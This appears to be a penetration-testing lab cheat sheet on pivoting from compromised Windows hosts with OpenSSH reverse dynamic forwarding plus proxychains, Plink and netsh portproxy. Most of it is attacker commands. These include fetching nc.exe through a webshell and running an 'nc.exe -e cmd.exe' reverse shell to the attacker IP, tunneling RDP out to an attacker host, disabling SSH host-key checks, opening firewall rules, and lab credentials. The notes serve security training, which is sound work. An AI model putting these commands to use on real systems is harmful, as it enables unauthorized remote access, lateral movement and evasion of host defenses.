# Port Forwarding and SSH Tunneling with Windwos Tools

* Use OpenSSH
* Use Plink (no dynamic remote port forwarding)
* Use Netsh

## Use OpenSSH Dynamic Remote Port Forwarding on Windows

Scenario

* Attacker has Remote Desktop access to Victims Windows machine
* Attacker establish a dynamic port forwarding with SSH client  
* Use proxychains to attack multiple ports via attackers port
* Requires a gcc compiler
* Download `https://github.com/rofl0r/proxychains-ng`

ProxyChains is a UNIX program, that hooks network-related libc functions in DYNAMICALLY LINKED programs via a preloaded DLL (dlsym(), LD_PRELOAD) and redirects the connections through SOCKS4a/5 or HTTP proxies. It supports TCP only (no UDP/ICMP etc).

Victim

* -v verbose
* -N don't open shell
* -R dynamic remote port forwarding (reverse)
* -o "UserKnownHostsFile=C:\Windows\Temp\hosts" ignore hosts file
* -o "StrictHostKeyChecking=no" ignore host key

```bash
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.175.64
where ssh
ssh -N -R 9998 bmoser@192.168.45.241 -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=C:\Windows\Temp\hosts"
```

Attacker

```bash
open /etc/proxychains.conf

# Configure proxy chain socks5 127.0.0.1 9998
sudo sed -i 's/socks .*/socks5 127.0.0.1 9998/g' /etc/proxychains.conf

# SQL Attack
proxychains psql -h 10.4.175.215 -U postgres

# Other
proxychains ./ssh_exe_exercise_client_aarch64 --ip-addr 10.4.175.215 --port 1234

```

## Use Plink for Remote Port Forwaring on Windows

Scenario

* Limitation: Does NOT support dynamic remote port forwarding
* Attacker drops a webshell on Victims Application Server
* Attacker copy nc to Victim
* Attacker run reverse shell using NC
* Use ssh like PLink for remote port forwarding e.g. Remote Desktop
* Usage <https://tartarus.org/~simon/putty-snapshots/htmldoc/Chapter7.html#plink-usage>

```bash
sudo systemctl start apache2
sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
nc -nvlp 4444
```

Victim

```bash
# Run via webshell .../umbraco/forms.aspx
powershell wget -Uri http://192.168.45.241/nc.exe -OutFile C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.241 4444
```

Attacker

```bash
# Run via rshell to forward xRDP
set /p pw="Passwort: "
powershell wget -Uri http://192.168.45.241/plink.exe -OutFile C:\Windows\Temp\plink.exe

# Forward Remote Desktop Port to Attacker local port 9999
C:\Windows\Temp\plink.exe -ssh -l USER -pw %pw% -R 127.0.0.1:9999:127.0.0.1:3389 ATTACKER-IP

# Pipe keystrokes with echo to PLink that forwards Remote Desktop Port to Attacker local port 9999
cmd.exe /c echo n | C:\Windows\Temp\plink.exe -ssh -l USER -pw %pw% -R 127.0.0.1:9999:127.0.0.1:3389 ATTACKER-IP

# Attack using the loopback port on kali linux
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9999
```

## Use Netsh (network shell) Port Forwarding on Windows

Scenario

* Limitation: Requires administrative privileges (otherwise UAC might block the setup)
* Attacker has Remote Desktop access
* Attack creates a tunnel between remote SSH port 22 to the local port 2222
* Use whoami /priv | find "Impersonate"
* Use netsh interface portproxy add v4tov4

Victim

```bash
xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:192.168.175.64

# Use net shell establish SSH tunnel to remote Victim
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.175.64 connectport=22 connectaddress=10.4.175.215

# Verify the tunnel connection
netstat -nat | find "2222"
netsh interface portproxy show all

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
192.168.175.64  2222        10.4.175.215    22

# Add a new firewall rule that allows incoming connection on port 2222
netsh advfirewall firewall add rule name="portproxy_ssh_2222" protocol=TCP dir=in localip=192.168.175.64 localport=2222 action=allow
Ok.

# Attack
sudo nmap -sS 192.168.175.64 -Pn -n -p2222
ssh database_admin@192.168.175.64 -p2222

# Cleanup, remove the firewall rule and the tunnel
netsh advfirewall firewall delete rule name="portproxy_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.175.64
```
